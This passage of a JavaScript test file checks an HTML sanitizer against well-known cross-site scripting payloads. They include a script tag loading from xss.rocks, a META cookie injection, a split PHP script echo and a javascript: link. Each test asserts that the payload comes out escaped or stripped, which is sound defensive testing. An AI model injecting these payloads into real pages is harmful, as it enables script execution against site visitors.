    const clean =
      '&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;&lt;/BODY&gt;&lt;/HTML&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Assuming you can only fit in a few characters and it filters against ".js"', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>';
    const clean =
      '&lt;SCRIPT SRC="http://xss.rocks/xss.jpg"&gt;&lt;/SCRIPT&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('PHP', () => {
    const sanitizer = new Sanitizer();
    const dirty = "<? echo('<SCR)';echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>";
    const clean =
      "&lt;? echo('&lt;SCR)';echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;";

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Cookie manipulation', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">';
    const clean =
      '&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(\'XSS\')&lt;/SCRIPT&gt;"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('JavaScript link location', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<A HREF="javascript:document.location=\'http://www.google.com/\'">XSS</A>';
    const clean = '<a href>XSS</a>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });
});
